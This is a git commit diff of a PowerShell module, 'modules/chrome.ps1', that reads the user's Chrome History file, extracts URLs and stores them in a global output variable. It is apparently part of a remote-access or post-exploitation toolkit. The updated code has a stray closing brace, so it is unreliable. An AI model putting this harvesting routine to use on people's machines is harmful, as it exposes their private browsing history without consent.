18d670e11cca0c5abd654f6ad5d185482ac071c5
josprou <34846208+josprou@users.noreply.github.com>
2023-05-19 03:54:45 +0200

    Update chrome.ps1

--- modules/chrome.ps1
+++ modules/chrome.ps1
@@ -1,19 +1,15 @@
-function Get-ChromeHistory {
-    $Path = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History"
-    if (-not (Test-Path -Path $Path)) {
-        Write-Verbose "[!] Could not find Chrome History for username: $UserName"
-    }
-    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-    $Value = Get-Content -Path $path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-    $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = 'Chrome'
-                DataType = 'History'
-                Data = $_
-            }
-        }
-    } 
+$Path = "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Google\Chrome\User Data\Default\History"
+$Out = ''
+if (-not (Test-Path -Path $Path)) {
+    Write-Verbose "[!] Could not find Chrome History for username: $UserName"
 }
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+$Value = Get-Content -Path $path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+$Value | ForEach-Object {
+    $Key = $_
+    if ($Key -match $Search){
+        $Out += "$env:UserName Chrome History $_"
+        }
+    }
+} 
+$global:execute=$Out
